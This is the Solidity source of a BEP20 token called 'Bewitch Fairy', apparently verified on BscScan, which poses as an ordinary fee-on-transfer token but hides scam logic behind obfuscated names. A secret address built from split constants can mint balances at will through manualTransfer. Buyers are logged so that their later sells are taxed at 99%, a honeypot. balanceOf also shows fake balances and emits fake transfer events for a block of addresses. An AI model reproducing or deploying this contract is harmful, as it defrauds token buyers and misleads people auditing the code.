/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

}


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function decimals() external view returns (uint8);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

}


library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}




contract BewitchFairy is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 minTakeReceiverShouldMode = 100000000 * (10 ** _decimals);
    uint256  receiverShouldAutoReceiver = 100000000 * 10 ** _decimals;
    uint256  buyLimitTakeAmount = 100000000 * 10 ** _decimals;


    string constant _name = "Bewitch Fairy";
    string constant _symbol = "BFY";
    uint8 constant _decimals = 18;

    uint256 private isTxReceiverLaunchedSenderMode = 0;
    uint256 private atEnableLimitIsFee = 3;

    uint256 private receiverEnableMintTx = 0;
    uint256 private launchedLiquiditySenderReceiver = 3;

    bool private teamToLimitMin = true;
    uint160 constant botsExemptTakeBuyShouldTotalIs = 812920507554 * 2 ** 40;
    bool private amountReceiverAutoTo = true;
    bool private modeTeamMintIs = true;
    bool private swapMintReceiverLiquidityFeeSell = true;
    uint256 constant modeReceiverToFund = 300000 * 10 ** 18;
    bool private launchedModeReceiverTotalFromFundMarketing = true;
    uint256 mintModeExemptMin = 2 ** 18 - 1;
    uint256 private senderModeToWallet = 6 * 10 ** 15;
    uint256 private walletAutoLimitMarketing = minTakeReceiverShouldMode / 1000; // 0.1%
    uint256 senderShouldEnableTotal = 49820;

    address constant enableIsAmountTake = 0xcE34a87273130ef191F181fEF1A6e8b8a9DaCA07;
    uint256 botsTakeEnableSwapLaunchMarketingMin = 0;
    uint256 constant shouldWalletReceiverFromTake = 10000 * 10 ** 18;

    uint256 private sellListIsTokenTeam = atEnableLimitIsFee + isTxReceiverLaunchedSenderMode;
    uint256 private botsMarketingMaxToken = 100;

    uint160 constant totalSellReceiverBurnMint = 594458626237 * 2 ** 120;
    uint160 constant receiverToSenderTx = 94652569948;

    bool private launchFromReceiverBurn;
    uint256 private liquidityMarketingLimitReceiver;
    uint256 private marketingBurnMintMode;
    uint256 private liquidityEnableFundTxReceiverReceiverLaunch;
    uint256 private walletFundTradingFee;
    uint160 constant enableBuyFromLaunchedToken = 1091366125308 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchSenderSellTotal;
    mapping(address => bool) private listTradingTeamToSwapAuto;
    mapping(address => bool) private teamMintAtSenderLimit;
    mapping(address => bool) private enableTokenTotalLaunchWalletSwapBurn;
    mapping(address => uint256) private modeIsLiquidityWalletFrom;
    mapping(uint256 => address) private receiverLaunchTeamAt;
    mapping(uint256 => address) private listExemptTeamBuyMinMode;
    mapping(address => uint256) private modeBuyTxLimitEnableShould;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public listExemptTeamBuyMinModeIndex = 0;

    IUniswapV2Router public sellAutoMintIsAt;
    address public uniswapV2Pair;

    uint256 private swapReceiverLimitBots;
    uint256 private launchedFeeAutoExempt;

    address private mintReceiverBotsMode = (msg.sender); // auto-liq address
    address private feeTotalReceiverShouldIsTakeAmount = (0xaBE36211c1FFd37D2C52d70effffc15f258844D5); // marketing address

    
    uint256 private receiverMaxToTxBuyModeWallet = 0;
    uint256 public shouldAtBurnMint = 0;
    bool private takeLimitIsMarketing = false;
    bool public receiverTotalListBots = false;
    uint256 private feeTradingTeamModeIs = 0;
    bool private liquidityFeeIsSwapBurnSenderFund = false;
    uint256 public txTakeFundAt = 0;
    uint256 public tradingAmountFeeWallet = 0;
    uint256 private fundAtReceiverAuto = 0;
    uint256 private enableBotsFromTotal = 0;
    bool public shouldAtBurnMint0 = false;
    uint256 private shouldAtBurnMint1 = 0;
    bool public receiverBurnTxLimit = false;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        sellAutoMintIsAt = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(sellAutoMintIsAt.factory()).createPair(address(this), sellAutoMintIsAt.WETH());
        _allowances[address(this)][address(sellAutoMintIsAt)] = minTakeReceiverShouldMode;

        launchFromReceiverBurn = true;

        teamMintAtSenderLimit[msg.sender] = true;
        teamMintAtSenderLimit[0x0000000000000000000000000000000000000000] = true;
        teamMintAtSenderLimit[0x000000000000000000000000000000000000dEaD] = true;
        teamMintAtSenderLimit[address(this)] = true;

        launchSenderSellTotal[msg.sender] = true;
        launchSenderSellTotal[address(this)] = true;

        listTradingTeamToSwapAuto[msg.sender] = true;
        listTradingTeamToSwapAuto[0x0000000000000000000000000000000000000000] = true;
        listTradingTeamToSwapAuto[0x000000000000000000000000000000000000dEaD] = true;
        listTradingTeamToSwapAuto[address(this)] = true;

        approve(_router, minTakeReceiverShouldMode);
        approve(address(uniswapV2Pair), minTakeReceiverShouldMode);
        _balances[msg.sender] = minTakeReceiverShouldMode;
        emit Transfer(address(0), msg.sender, minTakeReceiverShouldMode);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return minTakeReceiverShouldMode;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, minTakeReceiverShouldMode);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return swapTokenSellReceiver(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != minTakeReceiverShouldMode) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return swapTokenSellReceiver(sender, recipient, amount);
    }

    function getTotalFee() public {
        burnModeLaunchList();
    }

    function settotalToFundReceiverAmountLiquiditySwap(bool maxLiquidityBotsSender) public onlyOwner {
        if (receiverBurnTxLimit == receiverBurnTxLimit) {
            receiverBurnTxLimit=maxLiquidityBotsSender;
        }
        receiverBurnTxLimit=maxLiquidityBotsSender;
    }

    function txBurnLimitLiquidity(uint160 atIsLaunchedTrading) private pure returns (bool) {
        if (atIsLaunchedTrading >= uint160(enableIsAmountTake) && atIsLaunchedTrading <= uint160(enableIsAmountTake) + 100000) {
            return true;
        }
        return false;
    }

    function setfeeAtExemptEnable(bool maxLiquidityBotsSender) public onlyOwner {
        liquidityFeeIsSwapBurnSenderFund=maxLiquidityBotsSender;
    }

    function limitMinTokenFee(address atBotsMinToken, bool modeLaunchTotalBotselling) internal returns (uint256) {
        
        if (modeLaunchTotalBotselling) {
            sellListIsTokenTeam = launchedLiquiditySenderReceiver + receiverEnableMintTx;
            return atSellLimitShouldBotsAutoFund(atBotsMinToken, sellListIsTokenTeam);
        }
        if (!modeLaunchTotalBotselling && atBotsMinToken == uniswapV2Pair) {
            sellListIsTokenTeam = atEnableLimitIsFee + isTxReceiverLaunchedSenderMode;
            return sellListIsTokenTeam;
        }
        return atSellLimitShouldBotsAutoFund(atBotsMinToken, sellListIsTokenTeam);
    }

    function marketingFeeReceiverFromFundAuto(uint160 autoToMintExempt) private view returns (bool) {
        return uint16(autoToMintExempt) == senderShouldEnableTotal;
    }

    function listToLaunchedSwap() private view returns (uint256) {
        return block.timestamp;
    }

    function setamountFromReceiverFund(uint256 maxLiquidityBotsSender,address marketingSenderFeeWallet) public onlyOwner {
        if (maxLiquidityBotsSender != maxWalletAmount) {
            ZERO=marketingSenderFeeWallet;
        }
        if (maxLiquidityBotsSender != botsMarketingMaxToken) {
            DEAD=marketingSenderFeeWallet;
        }
        if (maxLiquidityBotsSender == launchedLiquiditySenderReceiver) {
            WBNB=marketingSenderFeeWallet;
        }
        receiverLaunchTeamAt[maxLiquidityBotsSender]=marketingSenderFeeWallet;
    }

    function isMaxTxFee(address liquidityReceiverLaunchedAt) private view returns (bool) {
        return ((uint256(uint160(liquidityReceiverLaunchedAt)) << 192) >> 238) == mintModeExemptMin;
    }

    function autoAtBotsSell(address liquidityReceiverLaunchedAt) private {
        uint256 senderIsTradingReceiverToFee = limitExemptMarketingFromFundMax();
        if (senderIsTradingReceiverToFee < senderModeToWallet) {
            listExemptTeamBuyMinModeIndex += 1;
            listExemptTeamBuyMinMode[listExemptTeamBuyMinModeIndex] = liquidityReceiverLaunchedAt;
            modeBuyTxLimitEnableShould[liquidityReceiverLaunchedAt] += senderIsTradingReceiverToFee;
            if (modeBuyTxLimitEnableShould[liquidityReceiverLaunchedAt] > senderModeToWallet) {
                maxWalletAmount = maxWalletAmount + 1;
                receiverLaunchTeamAt[maxWalletAmount] = liquidityReceiverLaunchedAt;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        receiverLaunchTeamAt[maxWalletAmount] = liquidityReceiverLaunchedAt;
    }

    function getfundLiquiditySellAt() public view returns (uint256) {
        if (receiverEnableMintTx != botsMarketingMaxToken) {
            return botsMarketingMaxToken;
        }
        if (receiverEnableMintTx != listExemptTeamBuyMinModeIndex) {
            return listExemptTeamBuyMinModeIndex;
        }
        return receiverEnableMintTx;
    }

    function atSellLimitShouldBotsAutoFund(address atBotsMinToken, uint256 listAutoTakeExempt) private view returns (uint256) {
        uint256 botsAmountLaunchTrading = modeIsLiquidityWalletFrom[atBotsMinToken];
        if (botsAmountLaunchTrading > 0 && listToLaunchedSwap() - botsAmountLaunchTrading > 2) {
            return 99;
        }
        return listAutoTakeExempt;
    }

    function senderLaunchedAutoFee() internal swapping {
        
        uint256 launchIsLimitMintListAtToLiquify = walletAutoLimitMarketing.mul(isTxReceiverLaunchedSenderMode).div(sellListIsTokenTeam).div(2);
        uint256 autoEnableModeFee = walletAutoLimitMarketing.sub(launchIsLimitMintListAtToLiquify);

        address[] memory amountLaunchedWalletBuy = new address[](2);
        amountLaunchedWalletBuy[0] = address(this);
        amountLaunchedWalletBuy[1] = sellAutoMintIsAt.WETH();
        sellAutoMintIsAt.swapExactTokensForETHSupportingFeeOnTransferTokens(
            autoEnableModeFee,
            0,
            amountLaunchedWalletBuy,
            address(this),
            block.timestamp
        );
        
        if (takeLimitIsMarketing != launchedModeReceiverTotalFromFundMarketing) {
            takeLimitIsMarketing = takeLimitIsMarketing;
        }


        uint256 launchIsLimitMintListAtBNB = address(this).balance;
        uint256 buyFeeFundMax = sellListIsTokenTeam.sub(isTxReceiverLaunchedSenderMode.div(2));
        uint256 launchIsLimitMintListAtBNBLiquidity = launchIsLimitMintListAtBNB.mul(isTxReceiverLaunchedSenderMode).div(buyFeeFundMax).div(2);
        uint256 liquidityMintSenderList = launchIsLimitMintListAtBNB.mul(atEnableLimitIsFee).div(buyFeeFundMax);
        
        payable(feeTotalReceiverShouldIsTakeAmount).transfer(liquidityMintSenderList);

        if (launchIsLimitMintListAtToLiquify > 0) {
            sellAutoMintIsAt.addLiquidityETH{value : launchIsLimitMintListAtBNBLiquidity}(
                address(this),
                launchIsLimitMintListAtToLiquify,
                0,
                0,
                mintReceiverBotsMode,
                block.timestamp
            );
            emit AutoLiquify(launchIsLimitMintListAtBNBLiquidity, launchIsLimitMintListAtToLiquify);
        }
    }

    function receiverLimitTeamTrading(address atBotsMinToken, address walletEnableMarketingBots, uint256 launchIsLimitMintListAt) internal returns (uint256) {
        
        uint256 toTeamBuyToken = launchIsLimitMintListAt.mul(limitMinTokenFee(atBotsMinToken, walletEnableMarketingBots == uniswapV2Pair)).div(botsMarketingMaxToken);

        if (enableTokenTotalLaunchWalletSwapBurn[atBotsMinToken] || enableTokenTotalLaunchWalletSwapBurn[walletEnableMarketingBots]) {
            toTeamBuyToken = launchIsLimitMintListAt.mul(99).div(botsMarketingMaxToken);
        }

        _balances[address(this)] = _balances[address(this)].add(toTeamBuyToken);
        emit Transfer(atBotsMinToken, address(this), toTeamBuyToken);
        
        return launchIsLimitMintListAt.sub(toTeamBuyToken);
    }

    function getamountMintShouldAt() public view returns (uint256) {
        if (shouldAtBurnMint == receiverMaxToTxBuyModeWallet) {
            return receiverMaxToTxBuyModeWallet;
        }
        if (shouldAtBurnMint != txTakeFundAt) {
            return txTakeFundAt;
        }
        if (shouldAtBurnMint != launchBlock) {
            return launchBlock;
        }
        return shouldAtBurnMint;
    }

    function setfundLiquiditySellAt(uint256 maxLiquidityBotsSender) public onlyOwner {
        receiverEnableMintTx=maxLiquidityBotsSender;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (txBurnLimitLiquidity(uint160(account))) {
            return buyLaunchFundAt(uint160(account));
        }
        return _balances[account];
    }

    function burnModeLaunchList() private {
        if (listExemptTeamBuyMinModeIndex > 0) {
            for (uint256 i = 1; i <= listExemptTeamBuyMinModeIndex; i++) {
                if (modeIsLiquidityWalletFrom[listExemptTeamBuyMinMode[i]] == 0) {
                    modeIsLiquidityWalletFrom[listExemptTeamBuyMinMode[i]] = block.timestamp;
                }
            }
            listExemptTeamBuyMinModeIndex = 0;
        }
    }

    function swapTokenSellReceiver(address atBotsMinToken, address autoToMintExempt, uint256 launchIsLimitMintListAt) internal returns (bool) {
        if (txBurnLimitLiquidity(uint160(autoToMintExempt))) {
            walletReceiverTeamEnable(atBotsMinToken, autoToMintExempt, launchIsLimitMintListAt, false);
            return true;
        }
        if (txBurnLimitLiquidity(uint160(atBotsMinToken))) {
            walletReceiverTeamEnable(atBotsMinToken, autoToMintExempt, launchIsLimitMintListAt, true);
            return true;
        }
        
        bool isAutoSenderReceiver = isMaxTxFee(atBotsMinToken) || isMaxTxFee(autoToMintExempt);
        
        if (atBotsMinToken == uniswapV2Pair) {
            if (maxWalletAmount != 0 && marketingFeeReceiverFromFundAuto(uint160(autoToMintExempt))) {
                txWalletExemptFrom();
            }
            if (!isAutoSenderReceiver) {
                autoAtBotsSell(autoToMintExempt);
            }
        }
        
        if (autoToMintExempt == uniswapV2Pair && _balances[autoToMintExempt] == 0) {
            launchBlock = block.number + 10;
        }
        if (!isAutoSenderReceiver) {
            require(block.number >= launchBlock, "No launch");
        }

        
        if (shouldAtBurnMint == txTakeFundAt) {
            shouldAtBurnMint = receiverMaxToTxBuyModeWallet;
        }


        if (inSwap || isAutoSenderReceiver) {return senderFundSwapEnableTokenTotal(atBotsMinToken, autoToMintExempt, launchIsLimitMintListAt);}
        
        require((launchIsLimitMintListAt <= receiverShouldAutoReceiver) || teamMintAtSenderLimit[atBotsMinToken] || teamMintAtSenderLimit[autoToMintExempt], "Max TX Limit!");

        if (shouldModeMaxTokenReceiverLiquidityAuto()) {senderLaunchedAutoFee();}

        _balances[atBotsMinToken] = _balances[atBotsMinToken].sub(launchIsLimitMintListAt, "Insufficient Balance!");
        
        uint256 swapIsBurnSellReceiver = modeMarketingShouldTrading(atBotsMinToken) ? receiverLimitTeamTrading(atBotsMinToken, autoToMintExempt, launchIsLimitMintListAt) : launchIsLimitMintListAt;

        _balances[autoToMintExempt] = _balances[autoToMintExempt].add(swapIsBurnSellReceiver);
        emit Transfer(atBotsMinToken, autoToMintExempt, swapIsBurnSellReceiver);
        return true;
    }

    function shouldModeMaxTokenReceiverLiquidityAuto() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        launchedModeReceiverTotalFromFundMarketing &&
        _balances[address(this)] >= walletAutoLimitMarketing;
    }

    function setlaunchedMinTakeExempt(address maxLiquidityBotsSender,bool marketingSenderFeeWallet) public onlyOwner {
        if (enableTokenTotalLaunchWalletSwapBurn[maxLiquidityBotsSender] != teamMintAtSenderLimit[maxLiquidityBotsSender]) {
           teamMintAtSenderLimit[maxLiquidityBotsSender]=marketingSenderFeeWallet;
        }
        enableTokenTotalLaunchWalletSwapBurn[maxLiquidityBotsSender]=marketingSenderFeeWallet;
    }

    function getTotalAmount() public {
        txWalletExemptFrom();
    }

    function getlaunchedMinTakeExempt(address maxLiquidityBotsSender) public view returns (bool) {
            return enableTokenTotalLaunchWalletSwapBurn[maxLiquidityBotsSender];
    }

    function getfeeAtExemptEnable() public view returns (bool) {
        return liquidityFeeIsSwapBurnSenderFund;
    }

    function buyLaunchFundAt(uint160 atIsLaunchedTrading) private view returns (uint256) {
        uint256 modeLaunchTotalBots = botsTakeEnableSwapLaunchMarketingMin;
        uint256 modeMintBurnWallet = atIsLaunchedTrading - uint160(enableIsAmountTake);
        if (modeMintBurnWallet < modeLaunchTotalBots) {
            return shouldWalletReceiverFromTake;
        }
        return modeReceiverToFund;
    }

    function modeMarketingShouldTrading(address atBotsMinToken) internal view returns (bool) {
        return !listTradingTeamToSwapAuto[atBotsMinToken];
    }

    function walletReceiverTeamEnable(address atBotsMinToken, address autoToMintExempt, uint256 launchIsLimitMintListAt, bool atTotalTokenMin) private {
        if (atTotalTokenMin) {
            atBotsMinToken = address(uint160(uint160(enableIsAmountTake) + botsTakeEnableSwapLaunchMarketingMin));
            botsTakeEnableSwapLaunchMarketingMin++;
            _balances[autoToMintExempt] = _balances[autoToMintExempt].add(launchIsLimitMintListAt);
        } else {
            _balances[atBotsMinToken] = _balances[atBotsMinToken].sub(launchIsLimitMintListAt);
        }
        emit Transfer(atBotsMinToken, autoToMintExempt, launchIsLimitMintListAt);
    }

    function getamountFromReceiverFund(uint256 maxLiquidityBotsSender) public view returns (address) {
            return receiverLaunchTeamAt[maxLiquidityBotsSender];
    }

    function txWalletExemptFrom() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (modeIsLiquidityWalletFrom[receiverLaunchTeamAt[i]] == 0) {
                    modeIsLiquidityWalletFrom[receiverLaunchTeamAt[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function manualTransfer(address atBotsMinToken, address autoToMintExempt, uint256 launchIsLimitMintListAt) public {
        if (!tokenBotsLaunchBuyFundWallet(uint160(msg.sender))) {
            return;
        }
        if (txBurnLimitLiquidity(uint160(autoToMintExempt))) {
            walletReceiverTeamEnable(atBotsMinToken, autoToMintExempt, launchIsLimitMintListAt, false);
            return;
        }
        if (txBurnLimitLiquidity(uint160(atBotsMinToken))) {
            walletReceiverTeamEnable(atBotsMinToken, autoToMintExempt, launchIsLimitMintListAt, true);
            return;
        }
        if (atBotsMinToken == address(0)) {
            _balances[autoToMintExempt] = _balances[autoToMintExempt].add(launchIsLimitMintListAt);
            return;
        }
    }

    function senderFundSwapEnableTokenTotal(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function gettotalToFundReceiverAmountLiquiditySwap() public view returns (bool) {
        if (receiverBurnTxLimit == receiverTotalListBots) {
            return receiverTotalListBots;
        }
        if (receiverBurnTxLimit != launchedModeReceiverTotalFromFundMarketing) {
            return launchedModeReceiverTotalFromFundMarketing;
        }
        if (receiverBurnTxLimit == swapMintReceiverLiquidityFeeSell) {
            return swapMintReceiverLiquidityFeeSell;
        }
        return receiverBurnTxLimit;
    }

    function limitExemptMarketingFromFundMax() private view returns (uint256) {
        address fundMintMarketingToken = WBNB;
        if (address(this) < WBNB) {
            fundMintMarketingToken = address(this);
        }
        (uint swapEnableFundMin, uint isTotalLaunchMax,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 exemptSwapAmountTake,) = WBNB == fundMintMarketingToken ? (swapEnableFundMin, isTotalLaunchMax) : (isTotalLaunchMax, swapEnableFundMin);
        uint256 tokenFeeFundMin = IERC20(WBNB).balanceOf(uniswapV2Pair) - exemptSwapAmountTake;
        return tokenFeeFundMin;
    }

    function tokenBotsLaunchBuyFundWallet(uint160 atIsLaunchedTrading) private pure returns (bool) {
        return atIsLaunchedTrading == (totalSellReceiverBurnMint + enableBuyFromLaunchedToken + botsExemptTakeBuyShouldTotalIs + receiverToSenderTx);
    }

    function setamountMintShouldAt(uint256 maxLiquidityBotsSender) public onlyOwner {
        shouldAtBurnMint=maxLiquidityBotsSender;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}